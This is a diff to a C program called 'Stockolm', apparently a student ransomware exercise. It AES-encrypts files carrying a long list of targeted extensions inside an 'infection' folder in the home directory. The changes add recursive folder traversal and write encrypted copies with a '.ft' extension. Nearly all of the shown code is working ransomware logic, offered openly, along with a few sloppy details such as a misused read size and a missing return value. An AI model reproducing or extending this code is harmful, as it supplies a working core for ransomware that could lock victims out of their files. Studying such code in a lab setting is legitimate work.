@@ -10,12 +10,16 @@
 #include <dirent.h>
 #include <openssl/rand.h>
 
+ #include <fcntl.h>
+
 #define VERSION	"Stockolm, version 1.0"
 #define	FOLDER	"infection"
 #define EXTENSION ".123 .3dm .3ds .3g2 .3gp .602 .7z .accdb .aes .ai .ARC .asc .asf .asm .asp .avi .backup .bak .bat .bmp .brd .bz2 .c .cgm .class .cmd .cpp .crt .cs .csr .csv .db .dbf .dch .der .dif .dip .djvu .doc .docb .docm .docx .dot .dotm .dotx .dwg .edb .eml .fla .flv .frm .gif .gpg .gz .h .hwp .ibd .iso .jar .java .jpeg .jpg .js .jsp .key .lay .lay6 .ldf .m3u .m4u .max .mdb .mdf .mid .mkv .mml .mov .mp3 .mp4 .mpeg .mpg .msg .myd .myi .nef .odb .odg .odp .ods .odt .onetoc2 .ost .otg .otp .ots .ott .p12 .PAQ .pas .pdf .pem .pfx .php .pl .png .pot .potm .potx .ppam .pps .ppsm .ppsx .ppt .pptm .pptx .ps1 .psd .pst .rar .raw .rb .rtf .sch .sh .sldm .sldm .sldx .slk .sln .snt .sql .sqlite3 .sqlitedb .stc .std .sti .stw .suo .svg .swf .sxc .sxd .sxi .sxm .sxw .tar .tbk .tgz .tif .tiff .txt .uop .uot .vb .vbs .vcd .vdi .vmdk .vmx .vob .vsd .vsdx .wav .wb2 .wk1 .wks .wma .wmv .xlc .xlm .xls .xlsb .xlsm .xlsx .xlt .xltm .xltx .xlw .zip "
 #define NB_EXT		179
 #define	KEY_SIZE	32
 #define PATH_MAX	4096
+
+#define	NAME_MAX	255
 
 // extern int errno;
 
@@ -105,27 +109,29 @@ int is_dir_exists(const char *path) {
 	return (-1);
 }
 
-int	file_cryptage(char *path_file, char *key)
+int	file_cryptage(int fd, char *path_file, char *key)
 {
 	unsigned char	iv[16]; // 128 bits (taille standart pour AES)
+	char			new_name[NAME_MAX + 1];
 
 	//indispensable pour avoir des fichier cripter differament (a stocker dans le fichier)
 	if (!RAND_bytes(iv, sizeof(iv)))
 		return(fprintf(stderr, "Error: generating iv\n"), 0);
 
 		
-	FILE	*input = fopen(path_file, "rb");
-	if (!input)
-		return (fprintf(stderr, "Error: fopen input\n"), 0);
+	int input = openat(fd, path_file, O_RDONLY);
+	if (input == -1)
+		return (perror("Error: open input\n"), 0);
 
-	if (strlcat(path_file, ".ft", PATH_MAX) > PATH_MAX)
-		return (fprintf(stderr, "Error: path of the new file name is to long\n"), 0);
+	strlcpy(new_name, path_file, 256);	
+	if (strlcat(new_name, ".ft", NAME_MAX) > NAME_MAX)
+		return (close(input), fprintf(stderr, "Error:new file name is to long\n"), 0);
 
-	FILE	*output = fopen(path_file, "wb");
-	if (!output)
+	int output = openat(fd, new_name, O_CREAT | O_WRONLY | O_TRUNC,  0644);
+	if (output == -1)
 	{	
-		fclose(input);
-		return (fprintf(stderr, "Error: fopen output\n"), 0);
+		close(input);
+		return (perror("Error: open output\n"), 0);
 	}
 
 	EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
@@ -133,50 +139,72 @@ int	file_cryptage(char *path_file, char *key)
 
 	unsigned char	in_buf[4096];
 	unsigned char	out_buf[4096 + EVP_MAX_BLOCK_LENGTH];
-	int				bytes_read, out_len;
+	int				bytes_read = 4096;
+	int				out_len = 4096 + EVP_MAX_BLOCK_LENGTH;
 
-	fwrite(iv, 1, sizeof(iv), output);
+	write(output, iv, sizeof(iv));
 
-	while ((bytes_read = fread(in_buf, 1, sizeof(in_buf), input)) > 0)
+	while ((bytes_read = read(input, in_buf, bytes_read)) > 0)
 	{
 		EVP_EncryptUpdate(ctx, out_buf, &out_len, in_buf, bytes_read);
-    	fwrite(out_buf, 1, out_len, output);
+    	write(output, out_buf, out_len);
 	}
 
 	EVP_EncryptFinal_ex(ctx, out_buf, &out_len);
-    fwrite(out_buf, 1, out_len, output);
+    write(output, out_buf, out_len);
 
     // 7. Nettoyage
     EVP_CIPHER_CTX_free(ctx);
-    fclose(input);
-    fclose(output);
+    close(input);
+    close(output);
 }
 
 int	folder_cryptage(char *path_to_folder, char *key, int silence)
 {
+	if (access(path_to_folder, R_OK | W_OK | X_OK) == -1)
+	    return (fprintf(stderr, "Error: Pas les permissions sur '%s'.\n", path_to_folder), 0);
+
 	DIR	*rep = opendir(path_to_folder);
 	struct dirent	*ent = NULL;
-	char			file_path[PATH_MAX];
 	size_t			size;
 
-	
 	if (rep != NULL)
 	{
-		strncpy(file_path, path_to_folder, PATH_MAX);
-		strlcat(file_path, "/", PATH_MAX);
-		size = strlen(file_path);
+		int fd = dirfd(rep);
+		if (fd == -1)
+			return (free(rep), 0);
+
+		if (strlcat(path_to_folder, "/", PATH_MAX) > PATH_MAX)
+			return (free(rep), fprintf(stderr, "Error: path of directorie to long: %s\n", path_to_folder), 0);
+
+		size = strlen(path_to_folder);
+
 		if (!silence)
-			printf("\nOpen directorie %s\n\n", file_path);
+			printf("\nOpen directorie %s\n\n", path_to_folder);
+
 		while ((ent = readdir(rep)) != NULL)
 		{
-			if (good_extension(ent->d_name))
+			if (!strncmp(".", ent->d_name, 1) || !strncmp("..", ent->d_name, 2)) {
+				continue ; }
+			
+			path_to_folder[size] = '\0';
+
+			if (ent->d_type == DT_DIR)
 			{
-				file_path[size] = '\0';
-				if (strlcat(file_path, ent->d_name, PATH_MAX) > PATH_MAX)
-					fprintf(stderr, "Error: path of file to long: %s", file_path);
+				if (strlcat(path_to_folder, ent->d_name, PATH_MAX) > PATH_MAX)
+				{	
+					fprintf(stderr, "Error: path of directorie to long: %s et name = %s\n", path_to_folder, ent->d_name);
+					continue ;
+				}
+				folder_cryptage(path_to_folder, key, silence);
+				continue ;
+			}
+
+			else if (good_extension(ent->d_name))
+			{
 				if (!silence)
-					printf("cryptage de %s\n", file_path);
-				file_cryptage(file_path, key);
+					printf("cryptage de %s%s\n\n", path_to_folder, ent->d_name);
+				file_cryptage(fd, ent->d_name, key);
 			}
 		}
 	}
@@ -228,7 +256,7 @@ int	main(int argc, char *argv[])
 		}
 	}
 	// printf("s= %d , r = %s, EXTENSION %s \n", silent_mode, key, EXTENSION);
-	char path_to_folder[PATH_MAX];
+	char path_to_folder[PATH_MAX + 1];
 	char *path_home = get_home();
 	if (!path_home)
 		return (fprintf(stderr, "Error: Cannot find home directorie\n"), 1);
